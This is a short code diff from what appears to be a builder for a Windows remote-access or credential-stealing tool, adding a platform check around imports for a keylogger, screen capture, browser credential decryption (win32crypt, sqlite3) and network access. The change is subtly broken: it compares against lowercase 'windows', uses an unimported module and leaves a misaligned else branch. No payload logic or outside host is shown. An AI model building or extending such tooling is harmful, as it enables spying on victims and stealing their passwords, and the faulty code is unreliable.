@@ -42,37 +42,40 @@ def replace_string(filename, old_string, new_string):
 
 def build():
     global key
-    try:
-        import socket
-        import json
-        import subprocess
-        import os
-        import pyautogui
-        import threading
-        import shutil
-        import sys
-        from os.path import isfile
-        import random
-        import string
-        from requests import get
-        from webbrowser import open as op
-        import getpass
-        import ctypes
-        from pynput.keyboard import Listener
-        import time
-        import win32crypt
-        import sqlite3
-        import base64
-        from PIL import ImageGrab
-        from urllib.request import Request, urlopen
+    if platform.system() == "windows":
+        try:
+            import socket
+            import json
+            import subprocess
+            import os
+            import pyautogui
+            import threading
+            import shutil
+            import sys
+            from os.path import isfile
+            import random
+            import string
+            from requests import get
+            from webbrowser import open as op
+            import getpass
+            import ctypes
+            from pynput.keyboard import Listener
+            import time
+            import win32crypt
+            import sqlite3
+            import base64
+            from PIL import ImageGrab
+            from urllib.request import Request, urlopen
 
-        from cryptography.hazmat.backends import default_backend
-        from cryptography.hazmat.primitives.ciphers import (
-            Cipher, algorithms, modes)
-    except Exception as moderror:
-        print(moderror)
-        print('run installed.bat and restart the tool')
-        exit()
+            from cryptography.hazmat.backends import default_backend
+            from cryptography.hazmat.primitives.ciphers import (
+                Cipher, algorithms, modes)
+        except Exception as moderror:
+            print(moderror)
+            print('run installed.bat and restart the tool')
+            exit()
+
+
     else:
         def genkey(length: int) -> bytes:
             return os.urandom(length)
